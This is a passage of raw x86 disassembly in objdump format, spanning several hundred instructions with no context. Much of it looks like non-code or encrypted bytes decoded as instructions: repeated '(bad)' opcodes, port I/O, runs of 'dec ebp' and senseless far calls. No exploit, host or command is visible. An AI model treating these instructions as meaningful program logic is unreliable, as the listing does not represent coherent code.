  425ed8:	sub    DWORD PTR [edx-0x100f342],esi
  425ede:	in     al,dx
  425edf:	mov    dl,0x80
  425ee1:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ee8:	or     eax,0xf8b25153
  425eed:	sub    DWORD PTR [edx-0x100f342],esi
  425ef3:	add    DWORD PTR [eax],ebx
  425ef5:	push   edx
  425ef6:	dec    ebp
  425ef7:	dec    ebp
  425ef8:	dec    ebp
  425ef9:	stos   BYTE PTR es:[edi],al
  425efa:	adc    BYTE PTR [edi-0x75587f76],0xec
  425f01:	mov    dl,0x53
  425f03:	jle    0x425f06
  425f05:	lock adc DWORD PTR [eax+0x41],0x4f
  425f0a:	aad    0x4d
  425f0c:	dec    ebp
  425f0d:	dec    ebp
  425f0e:	xor    BYTE PTR [edi+0x2d],0xed
  425f12:	(bad)  
  425f13:	or     eax,0xb20c07b2
  425f18:	mov    ah,0x29
  425f1a:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425f21:	lea    eax,[eax-0x72c5c133]
  425f27:	lea    ebp,[edx+0x4d814d96]
  425f2d:	xchg   edi,eax
  425f2e:	and    eax,0xbdd56a4f
  425f33:	xor    BYTE PTR [edi-0x79],0x80
  425f37:	lock xor cl,BYTE PTR [ecx]
  425f3a:	inc    esi
  425f3b:	std    
  425f3c:	or     al,0xb2
  425f3e:	mov    esi,0x80b6800c
  425f43:	std    
  425f44:	xor    BYTE PTR [edi-0x79],0x80
  425f48:	xchg   edi,eax
  425f49:	xor    dl,BYTE PTR [ebx+0x72]
  425f4c:	push   ebx
  425f4d:	sub    dh,BYTE PTR [edx+0x77802984]
  425f53:	and    edi,edi
  425f55:	inc    BYTE PTR [eax+0xada6371]
  425f5b:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425f62:	and    BYTE PTR [edi-0xda707f],0x10
  425f69:	and    eax,0xc87780ef
  425f6e:	xor    al,0x8b
  425f71:	or     DWORD PTR [esi-0x3],eax
  425f74:	or     al,0xb2
  425f76:	mov    esi,0xc8f0800c
  425f7b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f82:	mov    dl,0xba
  425f84:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f8a:	in     al,dx
  425f8b:	std    
  425f8c:	xor    BYTE PTR [edi+0x21],0x80
  425f90:	sbb    eax,0x500a0063
  425f95:	lock jno 0x425f7c
  425f98:	jl     0x425f5e
  425f9a:	outs   dx,DWORD PTR ds:[esi]
  425f9b:	adc    BYTE PTR [edi+0x21778055],0x80
  425fa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fa3:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425faa:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425fb1:	lea    ecx,[ebp+0x71f0508d]
  425fb7:	and    BYTE PTR [esi+0x4381a780],0x11
  425fbe:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425fc5:	and    BYTE PTR [esi-0x7fc28214],0x77
  425fcc:	xchg   DWORD PTR [eax-0x10],edx
  425fcf:	scas   eax,DWORD PTR es:[edi]
  425fd0:	xor    al,0x32
  425fd3:	or     DWORD PTR [esi-0x3],eax
  425fd6:	or     al,0xb2
  425fd8:	mov    esi,0x87f0800c
  425fdd:	and    BYTE PTR [edi+0x537c5332],0xa4
  425fe4:	mov    dl,0xba
  425fe6:	sub    edi,edi
  425fe8:	je     0x42603a
  425fea:	ja     0x426031
  425fec:	xor    BYTE PTR [edi+0x71],0xbe
  425ff0:	lds    edi,FWORD PTR [edx]
  425ff2:	lea    ecx,[ebp-0x7f788880]
  425ff8:	lock xor cl,BYTE PTR [ecx]
  425ffb:	inc    esi
  425ffc:	std    
  425ffd:	or     al,0xb2
  425fff:	mov    esi,0x87f0800c
  426004:	and    BYTE PTR [edi+0x29bab232],0x80
  42600b:	lock adc eax,0xa4537c53
  426011:	in     eax,dx
  426012:	mov    dl,0x8b
  426014:	push   DWORD PTR [esi+esi*4-0x42]
  426018:	arpl   WORD PTR [edx-0x72f412f7],si
  42601e:	lea    ecx,[ebp+0x171a780]
  426024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426025:	jae    0x426016
  426027:	inc    ebx
  426028:	std    
  426029:	push   eax
  42602a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42602b:	xor    eax,0x803df050
  426030:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  42603b:	or     al,0x80
  42603d:	ja     0x426036
  42603f:	and    BYTE PTR [edi+0x2984b27a],0x80
  426046:	ja     0x426010
  426048:	push   ebx
  426049:	sub    dl,BYTE PTR [ebx-0x5c]
  42604c:	call   DWORD PTR [ecx]
  42604e:	and    BYTE PTR [edi-0x7db9f675],0xc
  426055:	push   eax
  426056:	ja     0x4260ad
  426058:	xor    BYTE PTR [edi-0x38],0x6e
  42605c:	out    0x55,eax
  42605e:	in     eax,dx
  42605f:	mov    dl,0xa6
  426061:	mov    dl,0xc4
  426063:	or     al,0x80
  426065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426066:	mov    edx,DWORD PTR [ebx-0x5c]
  426069:	xor    BYTE PTR [edi+0x55b79455],ah
  42606f:	and    BYTE PTR [edi-0x740f7f38],0x9
  426076:	inc    esi
  426077:	adc    DWORD PTR [edx+esi*4],ecx
  42607a:	test   BYTE PTR [ecx],ch
  42607c:	xor    BYTE PTR [edi-0x38],0xb2
  426080:	mov    esi,0x8bf0800c
  426085:	push   ebx
  426086:	jo     0x42603a
  426088:	test   BYTE PTR [ecx],ch
  42608a:	xor    BYTE PTR [edi+0x55],0x53
  42608e:	lods   al,BYTE PTR ds:[esi]
  42608f:	jmp    DWORD PTR [eax+0x935f080]
  426095:	pop    esp
  426096:	xor    BYTE PTR [ebx+0x74],al
  426099:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42609f:	ja     0x4260f6
  4260a1:	xor    BYTE PTR [edi+0x7a],0x9
  4260a5:	inc    esi
  4260a6:	mov    dl,0xc
  4260a8:	mov    dl,0x86
  4260aa:	or     al,0x80
  4260ac:	ja     0x4260a5
  4260ae:	and    BYTE PTR [edi+0x2984b27a],0x80
  4260b5:	ja     0x4260ec
  4260b7:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  4260bb:	add    eax,0xa6a453a7
  4260c0:	adc    ebp,ecx
  4260c2:	mov    dl,0xa6
  4260c4:	xchg   esp,eax
  4260c5:	xchg   BYTE PTR [ebx+0x70],dl
  4260c8:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  4260cf:	mov    dl,0xc
  4260d1:	mov    dl,0x84
  4260d3:	or     al,0x57
  4260d5:	fstp   DWORD PTR [eax-0x21]
  4260d8:	adc    DWORD PTR [ebx+0x11],edx
  4260db:	addr16 out 0x58,al
  4260de:	fist   WORD PTR [ecx]
  4260e0:	xlat   BYTE PTR ds:[ebx]
  4260e1:	aaa    
  4260e2:	arpl   WORD PTR [ecx],dx
  4260e4:	xlat   BYTE PTR ds:[ebx]
  4260e5:	dec    esi
  4260e6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ea:	jno    0x4260d8
  4260ec:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  4260f2:	out    dx,eax
  4260f3:	(bad)  
  4260f4:	aad    0xe
  4260f6:	or     BYTE PTR [eax+eax*4],0xf0
  4260fa:	jno    0x4260e8
  4260fc:	cmp    al,BYTE PTR [eax+0x77eceff0]
  426102:	push   ebp
  426103:	xor    BYTE PTR [eax],0x3a
  426106:	out    dx,eax
  426107:	in     eax,dx
  426108:	ja     0x42613f
  42610a:	or     al,0x4d
  42610c:	lock cmp eax,0x4d234f09
  426112:	dec    ebp
  426113:	dec    ebp
  426114:	les    ebp,FWORD PTR [edi]
  426116:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  42611d:	adc    eax,0x7c45773a
  426122:	ja     0x42618e
  426124:	rcr    BYTE PTR [eax-0x21],1
  426127:	adc    DWORD PTR [eax-0x59],edx
  42612a:	jbe    0x4260ac
  42612c:	ja     0x426198
  42612e:	xor    al,0x76
  426131:	or     DWORD PTR [esi-0x3],eax
  426134:	or     al,0xb2
  426136:	mov    esi,0x6af0800c
  42613b:	and    BYTE PTR [edi+0x29bab276],0x80
  426142:	lock and DWORD PTR [eax+0x537c5330],eax
  426149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42614a:	push   DWORD PTR [ecx+eax*1+0x75]
  42614e:	mov    dl,0xe5
  426150:	xor    al,0x45
  426153:	arpl   di,bp
  426155:	rcl    DWORD PTR [ebp-0x80],cl
  426158:	ja     0x4261cb
  42615a:	in     al,dx
  42615b:	ja     0x426172
  42615d:	push   eax
  42615e:	ja     0x4261d1
  426160:	sub    BYTE PTR [ebp-0x12],0x50
  426164:	ja     0x42617b
  426166:	xor    BYTE PTR [edi-0x79],0x80
  42616a:	lock xor cl,BYTE PTR [ecx]
  42616d:	inc    esi
  42616e:	std    
  42616f:	or     al,0xb2
  426171:	mov    esi,0x87f0800c
  426176:	and    BYTE PTR [edi+0x53a45332],0x7c
  42617d:	push   DWORD PTR [edx+esi*4-0x46]
  426181:	sub    DWORD PTR [edi+0x77],ebx
  426184:	adc    eax,0xdbf4f09
  426189:	dec    ebp
  42618a:	dec    ebp
  42618b:	xor    al,0x8a
  42618e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426195:	or     al,0xe2
  426197:	or     eax,0xb2f7539d
  42619c:	clc    
  42619d:	sub    edi,edi
  42619f:	inc    BYTE PTR [eax-0x587f7569]
  4261a5:	mov    dl,BYTE PTR [ebx+0x7e]
  4261a8:	mov    dl,0x7
  4261aa:	or     al,0x53
  4261ac:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  4261b3:	inc    BYTE PTR [eax-0x587f7569]
  4261b9:	mov    dl,BYTE PTR [ebx+0x7e]
  4261bc:	mov    dl,0x7
  4261be:	or     al,0x53
  4261c0:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  4261c7:	inc    BYTE PTR [eax-0x587f7569]
  4261cd:	mov    dl,BYTE PTR [ebx+0x7e]
  4261d0:	push   ebx
  4261d1:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261d8:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  4261df:	dec    ebp
  4261e0:	dec    ebp
  4261e1:	dec    ebp
  4261e2:	xor    al,0x81
  4261e5:	adc    BYTE PTR [edi-0x79587f7a],0x53
  4261ec:	jle    0x426241
  4261ee:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261f5:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261fc:	dec    ebp
  4261fd:	dec    ebp
  4261fe:	xor    al,0x21
  426201:	xor    BYTE PTR [eax],0x80
  426204:	xchg   edi,eax
  426205:	mov    al,BYTE PTR [eax+0x7f808aa7]
  42620b:	or     dl,BYTE PTR [ebx+0x7e]
  42620e:	push   ebx
  42620f:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  426216:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  42621d:	dec    ebp
  42621e:	dec    ebp
  42621f:	xor    al,0x1d
  426222:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  426229:	sub    DWORD PTR [ebx+0x51],edx
  42622c:	mov    dl,0xbe
  42622e:	or     al,0xff
  426230:	inc    BYTE PTR [eax-0x587f7569]
  426236:	mov    dl,BYTE PTR [ebx-0x7e]
  426239:	xor    BYTE PTR [edi-0x76],0x53
  42623d:	jle    0x4261f1
  42623f:	mov    ah,0x29
  426241:	mov    dl,0x7
  426243:	or     al,0xff
  426245:	xchg   esp,eax
  426246:	and    BYTE PTR [edi-0x1203ac76],0xc6
  42624d:	or     eax,0xb20c86b2
  426252:	mov    ah,0x29
  426254:	push   DWORD PTR [esp+ebp*8-0x9]
  426258:	push   eax
  426259:	inc    ecx
  42625a:	sbb    ch,dl
  42625c:	dec    ebp
  42625d:	dec    ebp
  42625e:	dec    ebp
  42625f:	xor    al,0x8a
  426262:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426269:	or     al,0xe2
  42626b:	or     eax,0xb2f7539d
  426270:	clc    
  426271:	sub    edi,edi
  426273:	inc    BYTE PTR [eax-0x587f7569]
  426279:	mov    dl,BYTE PTR [ebx+0x7e]
  42627c:	mov    dl,0x7
  42627e:	or     al,0x53
  426280:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426287:	inc    BYTE PTR [eax-0x587f7569]
  42628d:	mov    dl,BYTE PTR [ebx+0x7e]
  426290:	mov    dl,0x7
  426292:	or     al,0x53
  426294:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42629b:	inc    BYTE PTR [ecx]
  42629d:	xchg   edi,eax
  42629e:	adc    DWORD PTR [eax+0x16],0x1
  4262a2:	aad    0x4d
  4262a4:	dec    ebp
  4262a5:	dec    ebp
  4262a6:	add    DWORD PTR [ecx],eax
  4262a8:	push   edx
  4262a9:	dec    ebp
  4262aa:	dec    ebp
  4262ab:	dec    ebp
  4262ac:	xchg   esi,eax
  4262ad:	xor    al,0x8a
  4262b0:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  4262b7:	sub    eax,0xbeb2f753
  4262bc:	or     al,0xb2
  4262be:	clc    
  4262bf:	sub    edi,edi
  4262c1:	(bad)  
  4262c2:	xchg   esi,eax
  4262c3:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  4262c7:	lea    ecx,[ebp+0x3e4c800a]
  4262cd:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4262d3:	xchg   edi,eax
  4262d4:	and    eax,0x3acd4c80
  4262d9:	lea    ecx,[ebp-0x7fde88b0]
  4262df:	ja     0x4262d0
  4262e1:	sub    bh,0xec
  4262e4:	lock and DWORD PTR [eax-0x10],edx
  4262e8:	and    DWORD PTR [eax-0x687f3710],eax
  4262ee:	mov    ecx,DWORD PTR [ecx]
  4262f0:	inc    esi
  4262f1:	mov    dh,0xc
  4262f3:	mov    dl,0x7
  4262f5:	or     al,0x80
  4262f7:	xchg   edi,eax
  4262f8:	enter  0xd780,0x8b
  4262fc:	push   ebx
  4262fd:	or     esi,DWORD PTR [edx-0x687fd608]
  426303:	enter  0x2a53,0xff
  426307:	push   ecx
  426308:	adc    bh,0x8b
  42630b:	or     DWORD PTR [esi-0x3e],eax
  42630e:	or     al,0xb2
  426310:	mov    BYTE PTR [eax+eax*4],cl
  426313:	xlat   BYTE PTR ds:[ebx]
  426314:	enter  0xa780,0x8b
  426318:	push   ebx
  426319:	pushf  
  42631a:	push   ebx
  42631b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42631c:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426323:	mov    dl,0x2
  426325:	sub    DWORD PTR [eax+0x46098bd7],eax
  42632b:	ret    0xb20c
  42632e:	mov    BYTE PTR [eax+eax*4],cl
  426331:	xlat   BYTE PTR ds:[ebx]
  426332:	enter  0xa780,0x8b
  426336:	push   ebx
  426337:	pushf  
  426338:	push   ebx
  426339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42633a:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426341:	mov    dl,0x2
  426343:	sub    DWORD PTR [eax+0x46098bd7],eax
  426349:	ret    0xb20c
  42634c:	mov    BYTE PTR [eax+eax*4],cl
  42634f:	xlat   BYTE PTR ds:[ebx]
  426350:	enter  0x9c53,0x80
  426354:	out    0x8b,eax
  426356:	push   ebx
  426357:	dec    ebp
  426358:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  42635f:	xlat   BYTE PTR ds:[ebx]
  426360:	and    DWORD PTR [edx-0x6979d6fe],esi
  426366:	xchg   DWORD PTR [ebp+0x4d],ecx
  426369:	xor    BYTE PTR [edi-0x51],0xab
  42636d:	test   eax,0x81fb70a3
  426372:	lea    edx,[edi-0x78127880]
  426378:	inc    ebp
  426379:	xchg   ebx,eax
  42637a:	cdq    
  42637b:	fwait
  42637c:	push   ebx
  42637d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42637e:	push   ebx
  42637f:	jo     0x4263fd
  426381:	ja     0x426305
  426383:	fstp   DWORD PTR [eax-0x21]
  426386:	adc    DWORD PTR [esi-0x7a],ebx
  426389:	pop    DWORD PTR [ebx+0x26]
  42638c:	push   eax
  42638d:	ja     0x426312
  42638f:	jl     0x426408
  426391:	xchg   ah,ah
  426393:	pop    eax
  426394:	fist   WORD PTR [ecx]
  426396:	push   eax
  426397:	ja     0x426320
  426399:	jl     0x426412
  42639b:	xchg   esi,esi
  42639d:	mov    ds:0x777c386f,eax
  4263a2:	enter  0xe9f6,0x6f
  4263a6:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  4263aa:	cli    
  4263ab:	and    al,0x6f
  4263ad:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  4263b1:	hlt    
  4263b2:	and    al,0x6f
  4263b4:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  4263b8:	mul    BYTE PTR [esi+ebp*8]
  4263bb:	cmp    BYTE PTR [ecx],al
  4263bd:	ja     0x4263ad
  4263bf:	push   eax
  4263c0:	ja     0x42634d
  4263c2:	xor    BYTE PTR [edi+0x1d],0x80
  4263c6:	bound  esi,QWORD PTR [esi]
  4263c8:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  4263ce:	xor    al,0x1d
  4263d1:	or     ch,0x2e
  4263d4:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  4263da:	pop    ebp
  4263db:	in     al,dx
  4263dc:	out    0x65,al
  4263de:	adc    BYTE PTR [edi+0x26508082],0x3a
  4263e5:	lea    ecx,[ebp-0x7f0618b0]
  4263eb:	out    0x83,eax
  4263ed:	or     DWORD PTR [esi-0x7b],eax
  4263f0:	or     al,0xb2
  4263f2:	popa   
  4263f3:	or     al,0x80
  4263f5:	out    0x82,eax
  4263f7:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  4263fe:	add    al,0xd4
  426400:	push   ebx
  426401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426402:	mov    dl,0xbc
  426404:	sub    DWORD PTR [eax+0x6394ff5f],eax
  42640a:	pushf  
  42640b:	xlat   BYTE PTR ds:[ebx]
  42640c:	push   edx
  42640d:	sbb    BYTE PTR [ecx],0x50
  426410:	xchg   edi,eax
  426411:	mov    eax,DWORD PTR [eax-0x687fea69]
  426417:	jno    0x426399
  426419:	xchg   edi,eax
  42641a:	and    DWORD PTR [ecx],eax
  42641c:	xchg   edi,eax
  42641d:	test   BYTE PTR [edx-0x697428b3],ch
  426423:	or     bl,BYTE PTR [ecx+0x11dd74d]
  426429:	ja     0x426424
  42642b:	dec    ebp
  42642c:	xlat   BYTE PTR ds:[ebx]
  42642d:	out    dx,eax
  42642e:	dec    ebp
  42642f:	xlat   BYTE PTR ds:[ebx]
  426430:	enter  0xd74d,0x32
  426434:	dec    ebp
  426435:	xlat   BYTE PTR ds:[ebx]
  426436:	xchg   DWORD PTR [edx],ecx
  426438:	add    DWORD PTR [edi-0x76],esi
  42643b:	or     al,BYTE PTR [esi+0x4d4d4bab]
  426441:	push   eax
  426442:	ja     0x426461
  426444:	xor    BYTE PTR [edi+0x1d],0x80
  426448:	lock and eax,0x80159250
  42644e:	ja     0x426475
  426450:	jl     0x4263df
  426452:	in     al,dx
  426453:	lea    ecx,[ebp-0x7b887f73]
  426459:	xor    al,0x25
  42645c:	push   eax
  42645d:	xchg   edx,eax
  42645e:	out    dx,al
  42645f:	xor    BYTE PTR [edi+0x71],0x80
  426463:	lock and eax,0x80ef9250
  426469:	ja     0x426480
  42646b:	xor    al,0x25
  42646e:	push   eax
  42646f:	xchg   edx,eax
  426470:	and    DWORD PTR [eax+0x6d7c2577],eax
  426476:	and    eax,0x8d8d8d3a
  42647b:	les    ebx,FWORD PTR [edi]
  42647d:	xor    BYTE PTR [edi+0x1d],0x80
  426481:	lock sbb eax,0x3a2ecd80
  426487:	lea    ecx,[ebp+0x3a265080]
  42648d:	lea    ecx,[ebp+0x3a438d80]
  426493:	push   eax
  426494:	ja     0x426420
  426496:	xor    BYTE PTR [edi-0x76],0xab
  42649a:	test   eax,0x1dfb70a3
  42649f:	lea    edx,[edi+0x77808780]
  4264a5:	and    DWORD PTR [edx-0x72c5c179],esp
  4264ab:	lea    edx,[ebx-0x9986467]
  4264b1:	and    al,0x6f
  4264b3:	cmp    BYTE PTR [ecx],cl
  4264b5:	dec    edi
  4264b6:	mov    esi,0x808d8da6
  4264bb:	ja     0x42652e
  4264bd:	addr16 cmc 
  4264bf:	and    al,0x6f
  4264c1:	cmp    BYTE PTR [ecx],cl
  4264c3:	dec    edi
  4264c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4264c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264c6:	lea    ecx,[ebp-0x26788884]
  4264cc:	pop    eax
  4264cd:	fist   WORD PTR [ecx]
  4264cf:	pop    esi
  4264d0:	xchg   BYTE PTR [edi+0x77502643],cl
  4264d6:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  4264da:	in     al,0x58
  4264dc:	fist   WORD PTR [ecx]
  4264de:	push   eax
  4264df:	ja     0x426467
  4264e1:	xor    BYTE PTR [edi-0x11],0x50
  4264e5:	ja     0x4264af
  4264e7:	xor    BYTE PTR [edi-0x38],0x80
  4264eb:	int    0x86
  4264ed:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  4264f3:	lea    edx,[eax+0x77]
  4264f6:	mov    esp,DWORD PTR [eax+0x7f]
  4264f9:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  4264ff:	lea    ecx,[ebp+0x5a7750b9]
  426505:	in     eax,dx
  426506:	push   0xd
  426508:	mov    ecx,0x80d17750
  42650d:	mov    dl,0xb9
  42650f:	push   eax
  426510:	ja     0x426528
  426512:	pop    esi
  426513:	int3   
  426514:	cmp    BYTE PTR [ebp-0x46087f73],cl
  42651a:	push   eax
  42651b:	xchg   edi,eax
  42651c:	loope  0x42651f
  42651e:	push   edx
  42651f:	or     al,0x1
  426521:	lahf   
  426522:	stos   BYTE PTR es:[edi],al
  426523:	cmp    BYTE PTR [esi-0x47],0x50
  426527:	xchg   edi,eax
  426528:	push   ds
  426529:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  426531:	jle    0x4264ec
  426533:	push   eax
  426534:	xchg   edi,eax
  426535:	int    0x1
  426537:	xchg   esi,eax
  426538:	push   ebp
  426539:	add    BYTE PTR [ebp-0x1518af47],0xed
  426540:	jl     0x4265bc
  426542:	mov    ecx,0x10fe750
  426547:	fistp  WORD PTR [ecx-0x47]
  42654a:	push   eax
  42654b:	out    0x4c,eax
  42654d:	mov    ecx,0xb9107750
  426552:	push   eax
  426553:	xlat   BYTE PTR ds:[ebx]
  426554:	pop    DWORD PTR [eax+0x7750b974]
  42655a:	inc    ecx
  42655b:	mov    ecx,0x4d6d1850
  426560:	dec    ebp
  426561:	dec    ebp
  426562:	in     eax,dx
  426563:	push   0x62
  426565:	mov    ecx,0x4dd84f50
  42656a:	dec    ebp
  42656b:	dec    ebp
  42656c:	add    DWORD PTR [edx+0x4f50b985],edx
  426572:	jne    0x4265c1
  426574:	dec    ebp
  426575:	dec    ebp
  426576:	in     eax,dx
  426577:	push   0xffffffd4
  426579:	mov    ecx,0x4d794f50
  42657e:	dec    ebp
  42657f:	dec    ebp
  426580:	add    DWORD PTR [edx+0x4f50b971],edx
  426586:	jge    0x4265d5
  426588:	dec    ebp
  426589:	dec    ebp
  42658a:	in     eax,dx
  42658b:	push   0xffffffc0
  42658d:	mov    ecx,0x4dda4f50
  426592:	dec    ebp
  426593:	dec    ebp
  426594:	mov    ecx,0x4d310150
  426599:	dec    ebp
  42659a:	dec    ebp
  42659b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  4265a0:	mov    cl,0x4d
  4265a2:	dec    ebp
  4265a3:	dec    ebp
  4265a4:	xor    BYTE PTR [edi-0x79],0x80
  4265a8:	lock xor cl,BYTE PTR [ecx]
  4265ab:	inc    esi
  4265ac:	std    
  4265ad:	or     al,0xb2
  4265af:	mov    esi,0x87f0800c
  4265b4:	adc    BYTE PTR [edi-0x385893ce],0x4
  4265bb:	aam    0x53
  4265bd:	jl     0x426612
  4265bf:	jb     0x426573
  4265c1:	mov    edx,0xc4fbff29
  4265c6:	xchg   edx,eax
  4265c7:	add    ebp,edx
  4265c9:	ja     0x426625
  4265cb:	mov    ecx,0x5c09a180
  4265d0:	sbb    DWORD PTR [ecx],ecx
  4265d2:	pop    esp
  4265d3:	jo     0x426628
  4265d5:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265db:	lea    esi,[esi+0x9bab207]
  4265e1:	(bad)  
  4265e2:	(bad)  
  4265e3:	adc    BYTE PTR [ecx+0x2f],al
  4265e6:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  4265ed:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265f4:	mov    dl,0x7
  4265f6:	or     al,0x80
  4265f8:	xchg   edi,eax
  4265f9:	stc    
  4265fa:	adc    bh,0x86
  4265fd:	push   ebx
  4265fe:	sub    dl,BYTE PTR [ebx+0xb]
  426601:	call   DWORD PTR [ecx-0x4e]
  426604:	clc    
  426605:	sub    esp,ebp
  426607:	mov    dl,0xed
  426609:	mov    ebp,DWORD PTR [edi-0x29]
  42660c:	icebp  
  42660d:	xor    BYTE PTR [edi-0x79],0x80
  426611:	lock xor cl,BYTE PTR [ecx]
  426614:	inc    esi
  426615:	std    
  426616:	or     al,0xb2
  426618:	mov    esi,0x87f0800c
  42661d:	adc    BYTE PTR [edi+0x537c5332],0x72
  426624:	mov    dl,0xba
  426626:	sub    edi,edi
  426628:	sti    
  426629:	les    edx,FWORD PTR [edx-0x32882aff]
  42662f:	mov    ecx,0x5c09a180
  426634:	sbb    DWORD PTR [ecx],ecx
  426636:	pop    esp
  426637:	jo     0x42668c
  426639:	adc    DWORD PTR [edx-0x72c7163e],esp
  42663f:	lea    esi,[esi+0x9bab207]
  426645:	(bad)  
  426646:	(bad)  
  426647:	adc    BYTE PTR [ecx+0x2f],al
  42664a:	inc    ecx
  42664b:	or     eax,0xf0804d4d
  426650:	stc    
  426651:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  426658:	mov    dl,0x7
  42665a:	or     al,0x80
  42665c:	xchg   edi,eax
  42665d:	stc    
  42665e:	adc    bh,0x86
  426661:	push   ebx
  426662:	sub    dl,BYTE PTR [ebx+0xb]
  426665:	call   DWORD PTR [ecx-0x4e]
  426668:	clc    
  426669:	sub    esp,ebp
  42666b:	mov    dl,0xed
  42666d:	mov    ecx,DWORD PTR [edi+edx*8-0x78887f0f]
  426674:	xor    al,0x32
  426677:	or     DWORD PTR [esi-0x3],eax
  42667a:	or     al,0xb2
  42667c:	mov    esi,0x87f0800c
  426681:	adc    BYTE PTR [edi+0x537c5332],0x72
  426688:	mov    dl,0xba
  42668a:	sub    edi,edi
  42668c:	sti    
  42668d:	les    esi,FWORD PTR [ebp+0x1]
  426690:	push   esi
  426691:	ja     0x426700
  426693:	dec    ebp
  426694:	dec    ebp
  426695:	dec    ebp
  426696:	mov    ecx,0x5c09a180
  42669b:	sbb    DWORD PTR [ecx],ecx
  42669d:	pop    esp
  42669e:	jo     0x4266f3
  4266a0:	adc    DWORD PTR [edx-0x72c7163e],esp
  4266a6:	lea    esi,[esi+0x9bab207]
  4266ac:	(bad)  
  4266ad:	(bad)  
  4266ae:	adc    BYTE PTR [ecx+0x2f],al
  4266b1:	prefetchw BYTE PTR [ebp+0x4d]
  4266b5:	xor    al,0xf9
  4266b8:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4266bf:	mov    dl,0x7
  4266c1:	or     al,0x80
  4266c3:	xchg   edi,eax
  4266c4:	stc    
  4266c5:	adc    bh,0x86
  4266c8:	push   ebx
  4266c9:	sub    dl,BYTE PTR [ebx+0xb]
  4266cc:	call   DWORD PTR [ecx-0x4e]
  4266cf:	clc    
  4266d0:	sub    esp,ebp
  4266d2:	mov    dl,0xed
  4266d4:	mov    ebp,edi
  4266d6:	xlat   BYTE PTR ds:[ebx]
  4266d7:	pop    esp
  4266d8:	add    DWORD PTR [edi-0x7],ecx
  4266db:	or     eax,0x77504d4d
  4266e0:	mov    eax,DWORD PTR [eax+0x49608b77]
  4266e6:	cmp    eax,0xef50d146
  4266eb:	icebp  
  4266ec:	outs   dx,BYTE PTR ds:[esi]
  4266ed:	sub    ecx,DWORD PTR [ebx]
  4266ef:	sub    BYTE PTR [eax+0xa],dl
  4266f2:	out    dx,al
  4266f3:	or     BYTE PTR [edi-0x7],0xd
  4266f7:	dec    ebp
  4266f8:	dec    ebp
  4266f9:	sbb    BYTE PTR [eax-0x7a],0xd
  4266fd:	dec    ebp
  4266fe:	dec    ebp
  4266ff:	push   eax
  426700:	xlat   BYTE PTR ds:[ebx]
  426701:	xchg   dl,bh
  426703:	and    ah,BYTE PTR [edi+ebp*2]
  426706:	cmp    BYTE PTR [ebx-0x4e],ah
  426709:	or     DWORD PTR [edi-0x2a],ecx
  42670c:	cmp    cl,BYTE PTR [ebp-0x7968a073]
  426712:	or     DWORD PTR [edi+0x6e],ecx
  426715:	cmp    cl,BYTE PTR [ebp+0x38305e8d]
  42671b:	lea    ecx,[ebp-0x74b0af47]
  426721:	or     eax,0x74804d4d
  426726:	mov    ecx,0xd854f50
  42672b:	dec    ebp
  42672c:	dec    ebp
  42672d:	pop    esi
  42672e:	daa    
  42672f:	cmp    BYTE PTR [ebp+0x4f50b98d],cl
  426735:	mov    cl,BYTE PTR ds:0x2c5e4d4d
